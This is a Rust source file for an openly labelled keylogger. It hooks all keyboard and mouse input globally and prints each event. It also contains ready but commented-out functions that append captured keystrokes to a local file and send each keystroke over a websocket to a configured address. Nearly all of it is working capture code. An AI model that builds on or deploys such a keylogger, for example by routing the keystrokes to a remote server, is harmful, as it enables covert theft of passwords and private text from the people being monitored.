use inputbot::{KeybdKey::*, MouseButton::*, *};
use std::fs::OpenOptions;
use std::io::prelude::*;
use tungstenite::{connect, Message};
use url::Url;

use device_query::{DeviceQuery, DeviceState, MouseState, Keycode};


const WS_ADDRESS:&str = "ws://localhost:8765";

fn passthrough_key(event: &str) {
    println!("{:?}", event);
    // file_writer(event);
    // ws_client(event);
}

fn file_writer(event: &str) {
    let mut file = OpenOptions::new()
    .write(true)
    .append(true)
    .open("text.txt")
    .unwrap();

    if let Err(e) = write!(file, "{}", event) {
        eprintln!("Couldn't write to file: {}", e);
    }
}

fn ws_client(event: &str) {
    // env_logger::init();
    let (mut socket, _response) =
    connect(Url::parse(&WS_ADDRESS).unwrap()).expect("Can't connect");
    socket.write_message(Message::Text(event.into())).unwrap();
}

fn main() {
    println!("Keylogger Running");
    keyboard_input();


    // let device_state = DeviceState::new();
    // let mouse: MouseState = device_state.get_mouse();
    // println!("Current Mouse Coordinates: {:?}", mouse.coords);
    // let keys: Vec<Keycode> = device_state.get_keys();
    // println!("Is A pressed? {}", keys.contains(&Keycode::A));
    // loop {
    //     let keys: Vec<Keycode> = device_state.get_keys();
    //     println!("{:?}", keys);
    //     println!("Is A pressed? {}", keys.contains(&Keycode::A));
    // }

}

fn keyboard_input() {
    // AKey.bind(|| { passthrough_key("a") });
    // BKey.bind(|| { passthrough_key("b") });
    // CKey.bind(|| { passthrough_key("c") });
    // DKey.bind(|| { passthrough_key("d") });
    // EKey.bind(|| { passthrough_key("e") });
    // FKey.bind(|| { passthrough_key("f") });
    // GKey.bind(|| { passthrough_key("g") });
    // HKey.bind(|| { passthrough_key("h") });
    // IKey.bind(|| { passthrough_key("i") });
    // JKey.bind(|| { passthrough_key("j") });
    // KKey.bind(|| { passthrough_key("k") });
    // LKey.bind(|| { passthrough_key("l") });
    // MKey.bind(|| { passthrough_key("m") });
    // NKey.bind(|| { passthrough_key("n") });
    // OKey.bind(|| { passthrough_key("o") });
    // PKey.bind(|| { passthrough_key("p") });
    // QKey.bind(|| { passthrough_key("q") });
    // RKey.bind(|| { passthrough_key("r") });
    // SKey.bind(|| { passthrough_key("s") });
    // TKey.bind(|| { passthrough_key("t") });
    // UKey.bind(|| { passthrough_key("u") });
    // VKey.bind(|| { passthrough_key("v") });
    // WKey.bind(|| { passthrough_key("w") });
    // XKey.bind(|| { passthrough_key("x") });
    // YKey.bind(|| { passthrough_key("y") });
    // ZKey.bind(|| { passthrough_key("z") });

    // EnterKey.bind(|| { passthrough_key("\n") });
    // SpaceKey.bind(|| { passthrough_key(" ") });

    // AKey.bind(|| { println!("a") });
    // let a: i32 = 0x032;
    // let b: u64 = a as u64;
    // OtherKey(b).bind(|| { println!("Z") });
    // OtherKey(0x041).bind(|| { println!("TEST") });

    KeybdKey::bind_all(|event| {
        println!("{:?}", event);
        match inputbot::from_keybd_key(event) {
            Some(c) => println!("{c}"),
            None => println!("Unregistered Key"),
        };
    });

    // Bind all mouse buttons to a common callback event.
    MouseButton::bind_all(|event| {
        println!("{:?}", event);
    });


    handle_input_events();
}